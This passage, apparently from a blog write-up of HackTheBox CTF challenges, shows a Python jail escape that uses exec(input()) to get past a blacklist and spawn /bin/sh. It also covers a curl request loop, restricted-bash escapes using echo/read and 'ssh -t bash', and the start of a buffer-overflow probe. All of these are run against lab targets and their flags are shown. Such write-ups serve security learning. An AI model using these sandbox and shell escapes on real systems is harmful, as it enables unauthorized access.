</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="s1">&#39;banned&#39;</span><span class="p">:</span> <span class="p">[],</span> <span class="s1">&#39;inp&#39;</span><span class="p">:</span> <span class="s1">&#39;print(locals())&#39;</span><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>If it wasn&rsquo;t found through trial and error yet, we can see the full list of blacklisted characters here:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">BLACKLIST</span><span class="s1">&#39;: (&#39;</span><span class="o">.</span><span class="s1">&#39;, &#39;</span><span class="n">_</span><span class="s1">&#39;, &#39;</span><span class="o">/</span><span class="s1">&#39;, &#39;</span><span class="s2">&#34;&#39;, &#39;;&#39;, &#39; &#39;, &#34;</span><span class="s1">&#39;&#34;, &#39;</span><span class="p">,</span><span class="s1">&#39;)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Under <code>globals</code> we find builtins is present. We must rely on these builtin functions to escape the jail and find our flag. A list of builtin functions can be found <a class="link" href="https://docs.python.org/3/library/functions.html"  target="_blank" rel="noopener"
    >here</a>. Input() caught my eye, as perhaps we can supply stdin that might not be checked through the blacklist:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">&gt;</span> <span class="n">a</span><span class="o">=</span><span class="nb">input</span><span class="p">()</span>                                                                                                         
</span></span><span class="line"><span class="cl">                                                                                                                    
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Input</span> <span class="n">accepted</span><span class="err">!</span>                                                                                                 
</span></span><span class="line"><span class="cl">                                                                                                                    
</span></span><span class="line"><span class="cl"><span class="n">Error</span><span class="p">:</span> <span class="n">invalid</span> <span class="n">syntax</span> <span class="p">(</span><span class="o">&lt;</span><span class="n">string</span><span class="o">&gt;</span><span class="p">,</span> <span class="n">line</span> <span class="mi">1</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Unfortunately, I received an error before being able to input anything for variable declaration. However, trying <code>input()</code> on its own seems to work as I expected:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">&gt;</span> <span class="nb">input</span><span class="p">()</span>                                                                                                           
</span></span><span class="line"><span class="cl">                                                                                                                    
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Input</span> <span class="n">accepted</span><span class="err">!</span>                                                                                                 
</span></span><span class="line"><span class="cl">                                                                                                                    
</span></span><span class="line"><span class="cl"><span class="s1">&#39;&#34;&#39;</span><span class="s2">&#34;Test aWE$%                                                                                                      </span>
</span></span><span class="line"><span class="cl"><span class="o">&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Here we see no blacklist notice despite putting several blacklisted characters. Perhaps we can use input in a different way? Next I tried <code>input</code> in combination with <code>exec</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">&gt;</span> <span class="n">exec</span><span class="p">(</span><span class="nb">input</span><span class="p">())</span>                                                                                                     
</span></span><span class="line"><span class="cl">                                                                                                                    
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Input</span> <span class="n">accepted</span><span class="err">!</span>                                                                                                 
</span></span><span class="line"><span class="cl">                                                                                                                    
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;This is a test.&#34;</span><span class="p">)</span>                                                                                            
</span></span><span class="line"><span class="cl"><span class="n">This</span> <span class="ow">is</span> <span class="n">a</span> <span class="n">test</span><span class="o">.</span>
</span></span><span class="line"><span class="cl"><span class="o">&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The print worked, and again no notice on blacklisted functions. From here there are several ways to read a flag. Since I wasn&rsquo;t sure what the flag was named or where it might be, I decided to create a shell session using a <a class="link" href="https://gtfobins.github.io/"  target="_blank" rel="noopener"
    >gtfobins</a> payload:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">&gt;</span> <span class="n">exec</span><span class="p">(</span><span class="nb">input</span><span class="p">())</span>                                                                                                     
</span></span><span class="line"><span class="cl">                                                                                                                    
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Input</span> <span class="n">accepted</span><span class="err">!</span>                                                                                                 
</span></span><span class="line"><span class="cl">                                                                                                                    
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span><span class="p">;</span> <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">whoami</span>
</span></span><span class="line"><span class="cl"><span class="n">ctf</span>  
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">ls</span>                                                                                                                  
</span></span><span class="line"><span class="cl"><span class="n">flag</span><span class="o">.</span><span class="n">txt</span>                                                                                                            
</span></span><span class="line"><span class="cl"><span class="n">jail</span><span class="o">.</span><span class="n">py</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">cat</span> <span class="n">flag</span><span class="o">.</span><span class="n">txt</span>                                                                                                        
</span></span><span class="line"><span class="cl"><span class="n">HTB</span><span class="p">{</span><span class="n">y0u_d3f34t3d_th3_sn4k3_g0d</span><span class="err">!</span><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>HTB{y0u_d3f34t3d_th3_sn4k3_g0d!}</code></p>
<h3 id="persistence">Persistence
</h3><blockquote>
<p>Thousands of years ago, sending a GET request to <strong>/flag</strong> would grant immense power and wisdom. Now it&rsquo;s broken and usually returns random data, but keep trying, and you might get lucky&hellip; Legends say it works once every 1000 tries.
<strong>Difficulty: very easy</strong></p>
</blockquote>
<hr>
<p>The objective for this problem is very straightforward: send a /GET request to IP:PORT/flag and you will receive the flag after ~1000 attempts.  1000 attempts is a rather high number to reach manually, so creating a loop for curl is the way to go:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="k">for</span> i in <span class="o">{</span>1..1000<span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="k">do</span>
</span></span><span class="line"><span class="cl">        curl -s 165.232.100.46:31980/flag 
</span></span><span class="line"><span class="cl"><span class="k">done</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>-s flag makes the curl request silent, otherwise we will get transmission informations on every curl attempt. This loop only runs for 1000 attempts, but if you&rsquo;re watching the program you can have it set to run indefinitely and just manually close it when the flag is seen.
Running the script:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ chmod +x loop.sh
</span></span><span class="line"><span class="cl">$ ./loop.sh <span class="p">|</span> grep <span class="s2">&#34;HTB&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>grep allows us to filter any uninteresting output and only shows our flag.
Eventually, we see the results pop out at us.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">HTB{y0u_h4v3_p0w3rfuL_sCr1pt1ng_ab1lit13S!}jW&amp;z3]X8CLb5Q7kR
</span></span></code></pre></td></tr></table>
</div>
</div><p>The flag information includes only HTB and the content in brackets. A cleaner grep would have extracted only the flag.
Overall, it seems output of the flag is based on a ~0.1% chance. On average, you will get the flag within 1000 requests but not always.
<code>HTB{y0u_h4v3_p0w3rfuL_sCr1pt1ng_ab1lit13S!}</code></p>
<h3 id="restricted">Restricted
</h3><blockquote>
<p>You &rsquo;re still trying to collect information for your research on the alien relic. Scientists contained the memories of ancient egyptian mummies into small chips, where they could store and replay them at will. Many of these mummies were part of the battle against the aliens and you suspect their memories may reveal hints to the location of the relic and the underground vessels. You managed to get your hands on one of these chips but after you connected to it, any attempt to access its internal data proved futile. The software containing all these memories seems to be running on a restricted environment which limits your access. Can you find a way to escape the restricted environment?
<strong>Difficulty: easy</strong></p>
</blockquote>
<hr>
<p>By exploring the provided sshd_config file, we can see for the user restricted we are permitted empty passwords. And so, our entry into the system is through ssh as the user restricted:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ssh restricted@167.99.86.8 -p <span class="m">32608</span>
</span></span><span class="line"><span class="cl">Linux ng-restricted-rtgbl-c6f644c76-t5z7n 5.18.0-0.deb11.4-amd64 <span class="c1">#1 SMP PREEMPT_DYNAMIC Debian 5.18.16-1~bpo11+1 (2022-08-12) x86_64</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
</span></span><span class="line"><span class="cl">the exact distribution terms <span class="k">for</span> each program are described in the
</span></span><span class="line"><span class="cl">individual files in /usr/share/doc/*/copyright.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span></span><span class="line"><span class="cl">permitted by applicable law.
</span></span><span class="line"><span class="cl">Last login: Thu Mar <span class="m">23</span> 23:40:20 <span class="m">2023</span> from 167.99.86.8
</span></span><span class="line"><span class="cl">restricted@ng-restricted-rtgbl-c6f644c76-t5z7n:~$
</span></span></code></pre></td></tr></table>
</div>
</div><p>Upon entry, we can check a few commands and see extremely limited options. We are unable to do traditional navigation commands such as <code>ls</code> or <code>cd</code>. However, we do have access to other powerful bash builtins such as <code>echo</code> and <code>read</code>. We can use <code>echo</code> to browse directories in a similar manner to <code>ls</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">restricted@ng-restricted-rtgbl-c6f644c76-t5z7n:~$ <span class="nb">echo</span> .*
</span></span><span class="line"><span class="cl">. .. .bash_history .bash_logout .bash_profile .bashrc .bin .profile
</span></span></code></pre></td></tr></table>
</div>
</div><p>In our current directory, there is nothing that looks like a flag. Checking elsewhere:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">restricted</span><span class="err">@</span><span class="n">ng</span><span class="o">-</span><span class="n">restricted</span><span class="o">-</span><span class="n">rtgbl</span><span class="o">-</span><span class="n">c6f644c76</span><span class="o">-</span><span class="n">t5z7n</span><span class="p">:</span><span class="o">~$</span> <span class="n">echo</span> <span class="o">/*</span>
</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">bin</span> <span class="o">/</span><span class="n">boot</span> <span class="o">/</span><span class="n">dev</span> <span class="o">/</span><span class="n">etc</span> <span class="o">/</span><span class="n">flag_8dpsy</span> <span class="o">/</span><span class="n">home</span> <span class="o">/</span><span class="n">lib</span> <span class="o">/</span><span class="n">lib64</span> <span class="o">/</span><span class="n">media</span> <span class="o">/</span><span class="n">memories</span><span class="o">.</span><span class="n">dump</span> <span class="o">/</span><span class="n">mnt</span> <span class="o">/</span><span class="n">opt</span> <span class="o">/</span><span class="n">proc</span> <span class="o">/</span><span class="n">root</span> <span class="o">/</span><span class="n">run</span> <span class="o">/</span><span class="n">sbin</span> <span class="o">/</span><span class="n">srv</span> <span class="o">/</span><span class="n">sys</span> <span class="o">/</span><span class="n">tmp</span> <span class="o">/</span><span class="n">usr</span> <span class="o">/</span><span class="k">var</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>flag_8dpsy</code> looks like a potential candidate. To view, we can leverage <code>echo</code> and <code>read</code> together:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">restricted@ng-restricted-rtgbl-c6f644c76-t5z7n:~$ <span class="nb">read</span> IFR &lt; /flag_8dpsy<span class="p">;</span> <span class="nb">echo</span> <span class="nv">$IFR</span>
</span></span><span class="line"><span class="cl">HTB<span class="o">{</span>r35tr1ct10n5_4r3_p0w3r1355<span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><hr>
<p>Alternative Method, selecting <code>bash</code> as ssh terminal.</p>
<p>User restricted has its default terminal set to rbash, the restricted terminal we previously worked in. However, we can just as easily pick our own terminal agent at ssh launch:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ssh restricted@167.99.86.8 -p <span class="m">32608</span> -t bash
</span></span><span class="line"><span class="cl">restricted@ng-restricted-rtgbl-c6f644c76-t5z7n:~$ whoami
</span></span><span class="line"><span class="cl">restricted
</span></span><span class="line"><span class="cl">restricted@ng-restricted-rtgbl-c6f644c76-t5z7n:~$ cat /flag_8dpsy 
</span></span><span class="line"><span class="cl">HTB<span class="o">{</span>r35tr1ct10n5_4r3_p0w3r1355<span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>HTB{r35tr1ct10n5_4r3_p0w3r1355}</code></p>
<h2 id="pwn">Pwn
</h2><h3 id="labyrinth">Labyrinth
</h3><blockquote>
<p>You find yourself trapped in a mysterious labyrinth, with only one chance to escape. Choose the correct door wisely, for the wrong choice could have deadly consequences.
<strong>Difficulty: easy</strong></p>
</blockquote>
<hr>
<p>We are given a labyrinth executable:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ file labyrinth    
</span></span><span class="line"><span class="cl">labyrinth: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./glibc/ld-linux-x86-64.so.2, BuildID[sha1]=86c87230616a87809e53b766b99987df9bf89ad8, for GNU/Linux 3.2.0, not stripped
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">$ checksec --file=labyrinth
</span></span><span class="line"><span class="cl">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified   Fortifiable     FILE
</span></span><span class="line"><span class="cl">Full RELRO      No canary found   NX enabled    No PIE          No RPATH   RW-RUNPATH   83 Symbols        No    0  4labyrinth
</span></span></code></pre></td></tr></table>
</div>
</div><p>We see this is a non stripped ELF 64-bit binary, and <code>checksec</code>  reveals no canary and no PIE.</p>
<p>Running labyrinth, from the very start, we are given a choice between 100 options:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-                             
</span></span><span class="line"><span class="cl">-             O               
</span></span><span class="line"><span class="cl">-            &#39;|&#39;              
</span></span><span class="line"><span class="cl">-            / \              
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Select door: 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Door: 001 Door: 002 Door: 003 Door: 004 Door: 005 Door: 006 Door: 007 Door: 008 Door: 009 Door: 010 
</span></span><span class="line"><span class="cl">Door: 011 Door: 012 Door: 013 Door: 014 Door: 015 Door: 016 Door: 017 Door: 018 Door: 019 Door: 020 
</span></span><span class="line"><span class="cl">Door: 021 Door: 022 Door: 023 Door: 024 Door: 025 Door: 026 Door: 027 Door: 028 Door: 029 Door: 030 
</span></span><span class="line"><span class="cl">Door: 031 Door: 032 Door: 033 Door: 034 Door: 035 Door: 036 Door: 037 Door: 038 Door: 039 Door: 040 
</span></span><span class="line"><span class="cl">Door: 041 Door: 042 Door: 043 Door: 044 Door: 045 Door: 046 Door: 047 Door: 048 Door: 049 Door: 050 
</span></span><span class="line"><span class="cl">Door: 051 Door: 052 Door: 053 Door: 054 Door: 055 Door: 056 Door: 057 Door: 058 Door: 059 Door: 060 
</span></span><span class="line"><span class="cl">Door: 061 Door: 062 Door: 063 Door: 064 Door: 065 Door: 066 Door: 067 Door: 068 Door: 069 Door: 070 
</span></span><span class="line"><span class="cl">Door: 071 Door: 072 Door: 073 Door: 074 Door: 075 Door: 076 Door: 077 Door: 078 Door: 079 Door: 080 
</span></span><span class="line"><span class="cl">Door: 081 Door: 082 Door: 083 Door: 084 Door: 085 Door: 086 Door: 087 Door: 088 Door: 089 Door: 090 
</span></span><span class="line"><span class="cl">Door: 091 Door: 092 Door: 093 Door: 094 Door: 095 Door: 096 Door: 097 Door: 098 Door: 099 Door: 100
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&gt;&gt; 1 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">[-] YOU FAILED TO ESCAPE!
</span></span></code></pre></td></tr></table>
</div>
</div><p>An incorrect answer exits the program. We can try to go through this manually, but we can also find the answer in the file itself:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ cat labyrinth
</span></span><span class="line"><span class="cl">&lt;..SNIP..&gt;
</span></span><span class="line"><span class="cl">                                                                                                                   
</span></span><span class="line"><span class="cl">                                                                                 
</span></span><span class="line"><span class="cl">-                                                                                                              
</span></span><span class="line"><span class="cl">-             O                                                                                                
</span></span><span class="line"><span class="cl">-            &#39;|&#39;                                                                                               
</span></span><span class="line"><span class="cl">-            / \                                                                                               
</span></span><span class="line"><span class="cl">                                                                                 
</span></span><span class="line"><span class="cl">                                                                                                                    
</span></span><span class="line"><span class="cl">Select door:                                                                                                        
</span></span><span class="line"><span class="cl">                                                                                                                    
</span></span><span class="line"><span class="cl">Door: 00%d Door: 0%d Door: %d                                                                                       
</span></span><span class="line"><span class="cl">&gt;&gt; 69069                                                                                                            
</span></span><span class="line"><span class="cl">You are heading to open the door but you suddenly see something on the wall:                                        
</span></span><span class="line"><span class="cl">                                                                                                                    
</span></span><span class="line"><span class="cl">&#34;Fly like a bird and be free!&#34;                                                                                      
</span></span><span class="line"><span class="cl">                                                                                                                    
</span></span><span class="line"><span class="cl">Would you like to change the door you chose?                                                                        
</span></span><span class="line"><span class="cl">                                                                                                                    
</span></span><span class="line"><span class="cl">&gt;&gt;
</span></span><span class="line"><span class="cl">&lt;..SNIP..&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>We can see <code>69069</code>, likely accepting valid answers for both 69 and 069.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-                             
</span></span><span class="line"><span class="cl">-             O               
</span></span><span class="line"><span class="cl">-            &#39;|&#39;              
</span></span><span class="line"><span class="cl">-            / \              
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Select door: 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Door: 001 Door: 002 Door: 003 Door: 004 Door: 005 Door: 006 Door: 007 Door: 008 Door: 009 Door: 010 
</span></span><span class="line"><span class="cl">Door: 011 Door: 012 Door: 013 Door: 014 Door: 015 Door: 016 Door: 017 Door: 018 Door: 019 Door: 020 
</span></span><span class="line"><span class="cl">Door: 021 Door: 022 Door: 023 Door: 024 Door: 025 Door: 026 Door: 027 Door: 028 Door: 029 Door: 030 
</span></span><span class="line"><span class="cl">Door: 031 Door: 032 Door: 033 Door: 034 Door: 035 Door: 036 Door: 037 Door: 038 Door: 039 Door: 040 
</span></span><span class="line"><span class="cl">Door: 041 Door: 042 Door: 043 Door: 044 Door: 045 Door: 046 Door: 047 Door: 048 Door: 049 Door: 050 
</span></span><span class="line"><span class="cl">Door: 051 Door: 052 Door: 053 Door: 054 Door: 055 Door: 056 Door: 057 Door: 058 Door: 059 Door: 060 
</span></span><span class="line"><span class="cl">Door: 061 Door: 062 Door: 063 Door: 064 Door: 065 Door: 066 Door: 067 Door: 068 Door: 069 Door: 070 
</span></span><span class="line"><span class="cl">Door: 071 Door: 072 Door: 073 Door: 074 Door: 075 Door: 076 Door: 077 Door: 078 Door: 079 Door: 080 
</span></span><span class="line"><span class="cl">Door: 081 Door: 082 Door: 083 Door: 084 Door: 085 Door: 086 Door: 087 Door: 088 Door: 089 Door: 090 
</span></span><span class="line"><span class="cl">Door: 091 Door: 092 Door: 093 Door: 094 Door: 095 Door: 096 Door: 097 Door: 098 Door: 099 Door: 100 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&gt;&gt; 69
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">You are heading to open the door but you suddenly see something on the wall:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&#34;Fly like a bird and be free!&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Would you like to change the door you chose?
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&gt;&gt; 69
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">[-] YOU FAILED TO ESCAPE!
</span></span></code></pre></td></tr></table>
</div>
</div><p>We progressed one stage, but we are still stuck. Is this second input expecting a number, or something else?</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Fly like a bird and be free!&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Would you like to change the door you chose?
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&gt;&gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">[-] YOU FAILED TO ESCAPE!
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">zsh: segmentation fault  ./labyrinth
</span></span></code></pre></td></tr></table>
</div>
</div><p>We reached a segmentation fault, so this might be a target for buffer overflow.</p>
<p>Using Radare2 to find win address:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
